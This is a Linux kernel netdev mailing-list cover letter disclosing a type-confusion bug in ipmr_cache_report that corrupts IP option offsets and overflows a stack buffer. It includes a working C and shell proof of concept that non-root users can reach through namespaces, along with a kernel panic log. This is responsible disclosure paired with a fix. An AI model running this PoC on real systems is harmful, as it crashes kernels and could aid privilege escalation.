Received: from mail-pj1-f41.google.com (mail-pj1-f41.google.com [209.85.216.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 376444CF465
	for <netdev@vger.kernel.org>; Sat, 17 Oct 2026 05:40:12 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792215614; cv=none; b=uyLTax7KCUVyY0KT5Phll9j+d7yZWJ/uRfofaRMUOXPs/fVAf2g2oYQY+h5VNvN+1ZVc5jX/7cdu076qIEOTofO1xzAlvBDtTEeV08jFQlQZVtQF41XVeuHfIYSmybXAsjQkjN+yWzkBUFlDbZPLvZ62yvoPm4Y9KgFoelZyk5c=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792215614; c=relaxed/simple;
	bh=M/21hL7jvztvdBjJWKRLhQIoSQBwrGeo8c0b4oN8PxM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=R9cenU5tX6h8PHLbh1gCluVw6PjzfgTqi5Q1gSdk6txY778X2LJqLDAlB6dI/IMY+Zj/TgObGP5htNDjNqPi2WHYAqr8ktsR/fv0Xb/YiqBs7j2qwIY7M6Vl0VWJO66VRWHPALrndPD1WlhtIM3pBHz9/tf6q+lZB30Fu78XlpQ=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=etxjApzP; arc=none smtp.client-ip=209.85.216.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="etxjApzP"
Received: by mail-pj1-f41.google.com with SMTP id 98e67ed59e1d1-3ab98332238so484785a91.3
        for <netdev@vger.kernel.org>; Fri, 16 Oct 2026 22:40:12 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792215612; x=1792820412; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=pySLfhcu9f8MvSKOfQl8yKHkCboqGXifxStlS2E04G0=;
        b=etxjApzPKxItthltUfU3PImVNNZ57N8sOUUAycy9vWbecePYIN4Ovd4xEPYjrjScDE
         dBvCjFkQLjg4fYFOg87GnLepsrCcATvPZSbCzMYjtx2ilAETFYyJKsNaFgrGe7Xua1CR
         8lPqW+8FfHc2LqbmBlUBBLNkCC0aUgbwynvQFIUycWgiCz/5mJ4lo0E/Nux7aJDYEjyq
         +zws2VjOnsYGL5ETCOuWZMmnEIILuPd5uOfYruL2+7K75VtxcnDeEs4w+PPz1PfKI6+8
         3mUUsrl7tjrpKzXCgCIL9zzlun1rq/RGgY+PDFxCDG9f9Be1agtd8Z0D1nWtCyESpqK8
         3HOQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792215612; x=1792820412;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=pySLfhcu9f8MvSKOfQl8yKHkCboqGXifxStlS2E04G0=;
        b=r1+nIgkUlKDVm9zEq/e7VwwUEiU6hLR970D1IR+uO9cUkc+VHg1CRoZFwdaLAw5FP6
         HqwajevXaACnvDt9vUJqwE06saW7WvcRFPI9+eG7aNiFmEMEu9Bhz5O/xeZ9uhr6Xofk
         jRc5I/rZX62ZEwyQ58qR2D9imR0en0ZFDNYBZMqRPVG3QilBh04DsFA/hcqy9GbsnJWl
         +EFEDK8U1Dykqyc/D6zr9CrMeKXyMByAzjbAg6ZFCYCL8HdJ2ECAhKod1eoD+1uLgG+e
         2CwagpYY5UCPMFcD1YR9LCCCZP+n1Mh2G3ISn3Ov9DbdZHY2911alIyG7CaEECypfn/O
         Jn9w==
X-Gm-Message-State: AFq9FYI4dAdo8nt0NVmrMIz8S3quVC1rHmKqMshvJhi/Fi8UXQC8rvpA
	hRxp5jPZWU4asprUeu3Af4uXczST+bO4LSF3BQEqvV9QPc+CgG65UrjVtyF0opJOzj4sjynGOog
	LtoNOgw==
X-Gm-Gg: AYBFou2jI69h+j0LTXA3kjdsGKSggQfT3NyLHTMfTe/MyDwNMFvP5nslq7t4goaTqA3
	0N1wDwBkqGC64XMud9r4927LuFPMpAimI5App+l0IdJFq3TNxUqUOOmyRx7i7yFIojh0ijXHdUJ
	PisGaXO8q92L4XFQRe6hUhzbZ1FYj5NR5yq5GPlgAoDSHs9DuMMUCuZECJC3yvesC4dFaBfPeq0
	m+lBFCvNbEPWpmAzLlm6S+lJ+RBtlF31BTWdxlqXka3WmwP5EJgR+aDV5bJjFVm64mFqNo7vMvQ
	Gpj2kGnOgG2JL6oDre1pNxF5gLikbQWXE61PTwL8lsAfggy+SSFXzBQR4b1Bq7uUtxSldyicS0l
	CatxbSDi2nkZjEfNigFFPbYjPgKuMN1xQ6fCT5suPgDqIic15jUnI7WcGAJwNqzX5zG+x/73i8s
	O3CqgSUnX4q+65wno6+taKiPfmxV3XpTsvfF9cmy4qxtWF2jjntfvyyXr3PDTU7bLEAB82b1WNw
	ICKptYEu1/J8nc=
X-Received: by 2002:a17:90a:d446:b0:3a4:e735:b39d with SMTP id 98e67ed59e1d1-3acef603b1dmr1504191a91.64.1792215612226;
        Fri, 16 Oct 2026 22:40:12 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([203.175.14.54])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3acd0cde4fdsm3393509a91.4.2026.10.16.22.40.09
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 16 Oct 2026 22:40:11 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org,
	idosch@nvidia.com
Cc: dsahern@kernel.org,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	leone4fernando@gmail.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net v5 0/1] ipmr: only copy pktinfo to cache reports
Date: Sat, 17 Oct 2026 13:39:56 +0800
Message-ID: <cover.1792215075.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/ipmr.c. The bug is reachable
by a non-root user via user and net namespaces with namespace-local
CAP_NET_ADMIN and CAP_NET_RAW.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ipmr_get_route() can clone a synthetic RTM_GETROUTE skb for an unresolved
multicast route and store the requester portid in NETLINK_CB(skb).portid
before queuing it to the unresolved multicast route path.

ipmr_cache_report() builds a short IGMP report for the raw mroute socket.
To support IP_PKTINFO, the original code calls ipv4_pktinfo_prepare() on
the input packet and copies the entire skb control block to the report skb.
For synthetic route-query packets, this copies NETLINK_CB bytes into a skb
that the raw IPv4 receive path interprets as IPCB. The requester portid
overlaps IPCB(skb)->opt fields. With IP_RECVOPTS or IP_RETOPTS enabled on
the mroute socket, corrupted option offsets can make the receive path copy
beyond the short report packet or overflow the fixed stack option buffer
in ip_options_echo().

The WHOLEPKT/WRVIFWHOLE path has a related issue: skb_realloc_headroom()
inherits the original IPCB, then prepends a 20-byte header with ihl = 5.
Stale IPCB(skb)->opt offsets then make ip_cmsg_recv_opts() copy bytes
from after that header as IP_RECVOPTS.

ipv4_pktinfo_prepare() also modifies the input skb control block. When
packet info is disabled on the mroute socket, it clears the pktinfo fields,
even though the input skb can continue through the data path.

Save and restore the original pkt->cb around ipv4_pktinfo_prepare(). Clear
the report skb control block and copy only the prepared pktinfo fields.
Doing this after both report branches preserves input skb metadata, keeps
IP_PKTINFO support, and clears inherited IP option state for
WHOLEPKT/WRVIFWHOLE reports.

Reproducer:

    make
    ./poc.sh namespace

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

mode="${1:-root}"

sysctl -w kernel.panic_on_warn=0 >/dev/null 2>&1 || true
sysctl -w kernel.printk="7 4 1 7" >/dev/null 2>&1 || true

make clean
make

case "$mode" in
root)
	exec ./poc
	;;
namespace)
	exec unshare -Urn --map-root-user ./poc
	;;
*)
	echo "usage: $0 [root|namespace]" >&2
	exit 1
	;;
esac

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/mroute.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define DEV_NAME "jwq0"
#define DEV_ADDR "10.23.0.1/24"
#define SRC_ADDR "10.23.0.2"
#define DST_ADDR "239.1.2.3"
#define NETLINK_PORTID 0x000f0001U

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	exit(EXIT_FAILURE);
}

static void die_errno(const char *msg)
{
	die("%s: %s", msg, strerror(errno));
}

static void run_cmd(const char *fmt, ...)
{
	char cmd[512];
	va_list ap;
	int rc;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	printf("[cmd] %s\n", cmd);
	fflush(stdout);
	rc = system(cmd);
	if (rc != 0)
		die("command failed (%d): %s", rc, cmd);
}

static void addattr_l(struct nlmsghdr *nlh, size_t maxlen, int type,
		      const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	size_t newlen = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
	struct rtattr *rta;

	if (newlen > maxlen)
		die("netlink attribute overflow");

	rta = (struct rtattr *)(((char *)nlh) + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	memcpy(RTA_DATA(rta), data, alen);
	nlh->nlmsg_len = newlen;
}

static int create_dummy_interface(void)
{
	unsigned int ifindex;

	run_cmd("ip link del %s 2>/dev/null || true", DEV_NAME);
	run_cmd("ip link set lo up");
	run_cmd("ip link add %s type dummy", DEV_NAME);
	run_cmd("ip addr add %s dev %s", DEV_ADDR, DEV_NAME);
	run_cmd("ip link set %s up", DEV_NAME);

	ifindex = if_nametoindex(DEV_NAME);
	if (!ifindex)
		die_errno("if_nametoindex(" DEV_NAME ")");

	printf("[*] %s ifindex=%u\n", DEV_NAME, ifindex);
	return (int)ifindex;
}

static int setup_mroute_socket(int ifindex)
{
	struct vifctl vif = {
		.vifc_vifi = 0,
		.vifc_flags = VIFF_USE_IFINDEX,
		.vifc_threshold = 1,
		.vifc_rate_limit = 0,
		.vifc_lcl_ifindex = ifindex,
	};
	int opt = 1;
	int fd;

	fd = socket(AF_INET, SOCK_RAW, IPPROTO_IGMP);
	if (fd < 0)
		die_errno("socket(AF_INET, SOCK_RAW, IPPROTO_IGMP)");

	if (setsockopt(fd, SOL_IP, IP_RETOPTS, &opt, sizeof(opt)) < 0)
		die_errno("setsockopt(IP_RETOPTS)");

	if (setsockopt(fd, IPPROTO_IP, MRT_INIT, &opt, sizeof(opt)) < 0)
		die_errno("setsockopt(MRT_INIT)");

	if (setsockopt(fd, IPPROTO_IP, MRT_ADD_VIF, &vif, sizeof(vif)) < 0)
		die_errno("setsockopt(MRT_ADD_VIF)");

	printf("[*] mroute socket ready on vif ifindex=%d\n", ifindex);
	return fd;
}

static int setup_netlink_socket(void)
{
	struct sockaddr_nl local = {
		.nl_family = AF_NETLINK,
		.nl_pid = NETLINK_PORTID,
	};
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		die_errno("socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)");

	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0)
		die_errno("bind(AF_NETLINK)");

	printf("[*] netlink portid=0x%08x\n", NETLINK_PORTID);
	printf("[*] portid bytes: optlen=%u srr=%u rr=%u ts=%u\n",
	       NETLINK_PORTID & 0xff,
	       (NETLINK_PORTID >> 8) & 0xff,
	       (NETLINK_PORTID >> 16) & 0xff,
	       (NETLINK_PORTID >> 24) & 0xff);
	return fd;
}

static void trigger_getroute(int nl_fd, int ifindex)
{
	struct {
		struct nlmsghdr nlh;
		struct rtmsg rtm;
		char buf[256];
	} req;
	struct sockaddr_nl kernel = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = &req,
		.iov_len = sizeof(req),
	};
	struct msghdr msg = {
		.msg_name = &kernel,
		.msg_namelen = sizeof(kernel),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	struct in_addr src;
	struct in_addr dst;

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	req.nlh.nlmsg_type = RTM_GETROUTE;
	req.nlh.nlmsg_flags = NLM_F_REQUEST;
	req.nlh.nlmsg_seq = 1;
	req.rtm.rtm_family = AF_INET;
	req.rtm.rtm_dst_len = 32;
	req.rtm.rtm_src_len = 32;

	if (inet_pton(AF_INET, SRC_ADDR, &src) != 1)
		die("inet_pton failed for %s", SRC_ADDR);
	if (inet_pton(AF_INET, DST_ADDR, &dst) != 1)
		die("inet_pton failed for %s", DST_ADDR);

	addattr_l(&req.nlh, sizeof(req), RTA_SRC, &src, sizeof(src));
	addattr_l(&req.nlh, sizeof(req), RTA_DST, &dst, sizeof(dst));
	addattr_l(&req.nlh, sizeof(req), RTA_IIF, &ifindex, sizeof(ifindex));

	iov.iov_len = req.nlh.nlmsg_len;

	printf("[*] sending RTM_GETROUTE for %s -> %s on ifindex %d\n",
	       SRC_ADDR, DST_ADDR, ifindex);
	fflush(stdout);
	if (sendmsg(nl_fd, &msg, 0) < 0)
		die_errno("sendmsg(RTM_GETROUTE)");
}

static void receive_report(int mrt_fd)
{
	char payload[512];
	char control[4096];
	struct iovec iov = {
		.iov_base = payload,
		.iov_len = sizeof(payload),
	};
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	ssize_t n;

	printf("[*] waiting for mroute report; recvmsg should crash in IP_RETOPTS\n");
	fflush(stdout);
	n = recvmsg(mrt_fd, &msg, 0);
	if (n < 0)
		die_errno("recvmsg(mroute_sk)");

	printf("[!] recvmsg returned %zd bytes without crashing\n", n);
}

int main(void)
{
	int ifindex;
	int mrt_fd;
	int nl_fd;

	printf("[*] ipmr_cache_report type-confusion trigger\n");
	printf("[*] expected rr copy length comes from first byte of %s (%u)\n",
	       DST_ADDR, 239U);

	ifindex = create_dummy_interface();
	mrt_fd = setup_mroute_socket(ifindex);
	nl_fd = setup_netlink_socket();

	trigger_getroute(nl_fd, ifindex);
	receive_report(mrt_fd);

	close(nl_fd);
	close(mrt_fd);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  195.459259] Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
[  195.460787] CPU: 2 UID: 1028 PID: 1307 Comm: poc Not tainted 6.12.95 #1
[  195.461640] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  195.463100] Call Trace:
[  195.463432]  <TASK>
[  195.463733]  panic (/home/roxy/linux-block-patch/build/../kernel/panic.c:955 (discriminator 1))
[  195.464178]  ? ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
[  195.464769]  __stack_chk_fail (/home/roxy/linux-block-patch/build/../kernel/panic.c:1195 (discriminator 1))
[  195.465309]  ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
[  195.465878]  ? __skb_datagram_iter (/home/roxy/linux-block-patch/build/../include/linux/skbuff.h:2533 /home/roxy/linux-block-patch/build/../net/core/datagram.c:394)
[  195.466458]  ? __pfx_simple_copy_to_iter+0x10/0x10
[  195.467091]  ? ____sys_recvmsg+0x98/0x1d0
[  195.467633]  ? ___sys_recvmsg+0x91/0xe0
[  195.468154]  ? srso_alias_return_thunk+0x5/0xfbef5
[  195.468802]  ? __sys_recvmsg+0x83/0xe0
[  195.469305]  ? do_syscall_64+0x58/0x120
[  195.469824]  ? entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  195.470498]  </TASK>
[  195.470983] Kernel Offset: disabled

-----END crash log-----

Zhiling Zou (1):
  ipmr: only copy pktinfo to cache reports

 net/ipv4/ipmr.c | 9 +++++++--
 1 file changed, 7 insertions(+), 2 deletions(-)

-- 
2.55.0

